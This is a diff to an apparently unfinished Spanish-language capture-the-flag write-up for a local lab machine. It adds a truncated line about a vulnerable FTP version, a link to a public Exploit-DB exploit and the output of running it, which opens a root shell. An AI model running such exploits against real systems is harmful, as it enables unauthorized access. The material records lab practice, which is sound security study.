@@ -38,14 +38,27 @@ Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
 
 ## FTP (21 TCP Port)
 
-Enumerando el servicio **FTP**
+Enumerando el servicio **FTP** nos encontramos con una versión que tiene una vul
 
 
 
 
-# Usuario XXX
 
 
-# Escalada de privilegios
+
+
 
 Haciendo una investigación a nivel local del sistema ...
+
+https://www.exploit-db.com/exploits/49757
+
+```
+> python3 49757 172.17.0.2
+
+/home/rh4ps00dy/Downloads/firsthacking/49757:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+Success, shell opened
+Send `exit` to quit shell
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
